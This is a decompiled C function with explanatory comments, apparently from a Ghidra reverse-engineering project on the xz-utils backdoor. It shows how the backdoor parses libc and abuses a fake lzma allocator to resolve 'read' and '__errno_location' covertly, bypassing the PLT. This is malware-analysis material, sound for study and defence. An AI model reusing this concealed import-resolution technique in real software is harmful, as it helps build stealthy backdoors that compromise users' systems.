// /home/kali/xzre-ghidra/xzregh/1045E0_resolve_libc_imports.c
// Function: resolve_libc_imports @ 0x1045E0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall resolve_libc_imports(link_map * libc, elf_info_t * libc_info, libc_imports_t * imports)


/*
 * AutoDoc: Treats `link_map *libc` as another ELF image, runs `elf_parse` to populate `elf_info_t`, and
 * then allocates trampolines for `read` and `__errno_location` via the fake allocator shim. Only
 * when both imports succeed does it mark `libc_imports_t` as ready, ensuring subsequent socket
 * I/O helpers can operate without touching the real PLT.
 */
#include "xzre_types.h"


BOOL resolve_libc_imports(link_map *libc,elf_info_t *libc_info,libc_imports_t *imports)

{
  BOOL BVar1;
  lzma_allocator *allocator;
  _func_25 *p_Var2;
  _func_26 *p_Var3;
  lzma_allocator *resolver;
  
  allocator = get_lzma_allocator();
  BVar1 = elf_parse(*(Elf64_Ehdr **)libc,libc_info);
  if (BVar1 != FALSE) {
    allocator->opaque = libc_info;
    p_Var2 = (_func_25 *)lzma_alloc(0x308,allocator);
    imports->read = p_Var2;
    if (p_Var2 != (_func_25 *)0x0) {
      imports->resolved_imports_count = imports->resolved_imports_count + 1;
    }
    p_Var3 = (_func_26 *)lzma_alloc(0x878,allocator);
    imports->__errno_location = p_Var3;
    if (p_Var3 != (_func_26 *)0x0) {
      imports->resolved_imports_count = imports->resolved_imports_count + 1;
    }
    BVar1 = (BOOL)(imports->resolved_imports_count == 2);
  }
  return BVar1;
}

